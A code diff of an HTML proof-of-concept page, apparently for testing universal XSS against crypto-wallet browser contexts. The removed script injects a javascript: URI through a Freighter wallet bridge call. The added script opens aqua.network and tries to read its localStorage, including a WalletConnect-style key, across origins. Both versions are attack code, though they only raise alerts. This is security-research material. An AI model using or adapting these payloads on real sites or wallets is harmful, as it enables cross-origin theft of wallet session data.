@@ -1,20 +1,12 @@
+<button onclick="test()">TEST UXSS</button>
 <script>
-// Test 1: via.searchText javascript: URI
-try {
-  // Freighter punya objek via / freighterApi
-  let bridge = window.via || window.freighterApi || window.freighter;
-  console.log('bridge:', bridge);
-  
-  setInterval(() => {
-    try {
-      via.searchText("javascript:alert('XSS via.searchText: '+document.domain)");
-    } catch(e){ console.log('via err', e.message) }
-  }, 100);
-
-  // Test 2: Fallback kalau via gak ada, pakai location
-  setTimeout(() => {
-    window.location.href = "https://modzero.com";
-  }, 1500);
-  
-} catch(e){ alert('ERR:'+e.message) }
+function test(){
+  let win = window.open('https://aqua.network','_blank');
+  setTimeout(()=>{
+    try{
+      alert('aqua ls: '+win.localStorage.length);
+      alert('LEAK: '+win.localStorage.getItem('wc:blabla'));
+    }catch(e){ alert('BLOCKED: '+e.message) }
+  }, 3000);
+}
 </script>
